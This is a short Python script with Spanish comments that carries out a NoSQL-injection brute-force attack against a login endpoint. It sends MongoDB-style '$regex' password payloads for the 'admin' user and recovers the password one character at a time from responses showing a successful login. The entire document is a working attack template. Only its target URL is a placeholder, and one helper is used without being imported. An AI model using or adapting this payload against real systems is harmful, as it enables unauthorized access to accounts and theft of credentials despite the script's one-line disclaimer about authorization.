# Este script realiza un ataque de fuerza bruta basado en inyección NoSQL contra un endpoint de autenticación.
# Explota vulnerabilidades en bases de datos NoSQL para obtener acceso no autorizado. Úselo solo con autorización.

import requests, time, sys, signal, string

# Manejador de señal para salir del programa de forma limpia
def def_handler(sig, frame):
    print("\n\n [!]Saliendo... ")
    sys.exit(1)

# Configurar el manejador de señal para Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales

# EDITAR: Reemplazar con la URL real del endpoint de inicio de sesión
login_url = "http://test.com" # Editar esta línea con la URL correcta

# Caracteres a usar en el ataque de fuerza bruta
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    password = ""

    # EDITAR: Importar la biblioteca 'log' o reemplazar con declaraciones print
    p1 = log.progress("Fuerza bruta")
    p1.status("Inicializando proceso...")

    for position in range(1, 24):  # Prueba hasta 23 caracteres de longitud
        for character in characters:
            # Construir el payload para la inyección NoSQL
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
            headers = {'Content-Type': 'application/json'}
            
            # Enviar solicitud POST
            r = requests.post(login_url, headers=headers, data=post_data)

            # Verificar si la autenticación fue exitosa
            if "Logged in as user" in r.text:
                password += character
                break

    # EDITAR: Agregar código para manejar el resultado final, por ejemplo:
    # print(f"Contraseña encontrada: {password}")

# Punto de entrada principal del script
if __name__ == '__main__':
    makeNoSQLI()
